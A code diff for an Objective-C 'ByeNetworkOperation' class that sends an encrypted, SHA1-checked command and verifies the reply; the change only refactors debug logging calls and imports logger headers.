@@ -13,7 +13,8 @@
 #import "NSMutableData+SHA1.h"
 #import "NSData+SHA1.h"
 
-//#define DEBUG_BYE_NOP
+#import "RCSMLogger.h"
+#import "RCSMDebug.h"
 
 
 @implementation ByeNetworkOperation
@@ -25,7 +26,7 @@
       mTransport  = aTransport;
       
 #ifdef DEBUG_BYE_NOP
-      infoLog(ME, @"mTransport: %@", mTransport);
+      infoLog(@"mTransport: %@", mTransport);
 #endif
       
       return self;
@@ -37,7 +38,7 @@
 - (BOOL)perform
 {
 #ifdef DEBUG_BYE_NOP
-  infoLog(ME, @"");
+  infoLog(@"");
 #endif
   
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
@@ -50,7 +51,7 @@
   [commandData appendData: commandSha];
   
 #ifdef DEBUG_BYE_NOP
-  infoLog(ME, @"commandData: %@", commandData);
+  infoLog(@"commandData: %@", commandData);
 #endif
   
   [commandData encryptWithKey: gSessionKey];
@@ -69,7 +70,7 @@
   [replyDecrypted decryptWithKey: gSessionKey];
   
 #ifdef DEBUG_BYE_NOP
-  infoLog(ME, @"reply: %@", replyDecrypted);
+  infoLog(@"reply: %@", replyDecrypted);
 #endif
   
   uint32_t protoCommand;
@@ -81,7 +82,7 @@
   @catch (NSException *e)
     {
 #ifdef DEBUG_UP_NOP
-      errorLog(ME, @"exception on sha makerange (%@)", [e reason]);
+      errorLog(@"exception on sha makerange (%@)", [e reason]);
 #endif
       
       [replyDecrypted release];
@@ -111,7 +112,7 @@
   @catch (NSException *e)
     {
 #ifdef DEBUG_BYE_NOP
-      errorLog(ME, @"exception on sha makerange (%@)", [e reason]);
+      errorLog(@"exception on sha makerange (%@)", [e reason]);
 #endif
       
       [replyDecrypted release];
@@ -124,14 +125,14 @@
   shaLocal = [shaLocal sha1Hash];
   
 #ifdef DEBUG_BYE_NOP
-  infoLog(ME, @"shaRemote: %@", shaRemote);
-  infoLog(ME, @"shaLocal : %@", shaLocal);
+  infoLog(@"shaRemote: %@", shaRemote);
+  infoLog(@"shaLocal : %@", shaLocal);
 #endif
   
   if ([shaRemote isEqualToData: shaLocal] == NO)
     {
 #ifdef DEBUG_BYE_NOP
-      errorLog(ME, @"sha mismatch");
+      errorLog(@"sha mismatch");
 #endif
       
       [replyDecrypted release];
